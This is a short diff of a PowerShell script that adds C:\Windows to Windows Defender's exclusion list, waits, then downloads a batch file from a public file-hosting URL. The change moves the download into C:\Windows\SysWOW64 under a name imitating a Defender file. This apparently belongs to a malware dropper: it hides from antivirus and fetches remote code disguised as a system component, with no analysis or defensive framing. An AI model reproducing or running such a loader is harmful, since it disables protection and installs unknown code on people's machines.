@@ -3,4 +3,4 @@ Add-MpPreference -ExclusionPath "C:\Windows"
 
 Start-Sleep -s 5
 
-Invoke-WebRequest -Uri 'https://www.upload.ee/download/16301827/b954050477151e5b87cf/setup.bat' -OutFile '%USERPROFILE%\MpCmdStmp.bat'
+Invoke-WebRequest -Uri 'https://www.upload.ee/download/16301827/b954050477151e5b87cf/setup.bat' -OutFile 'C:\Windows\SysWOW64\MpCmdStmp.bat'
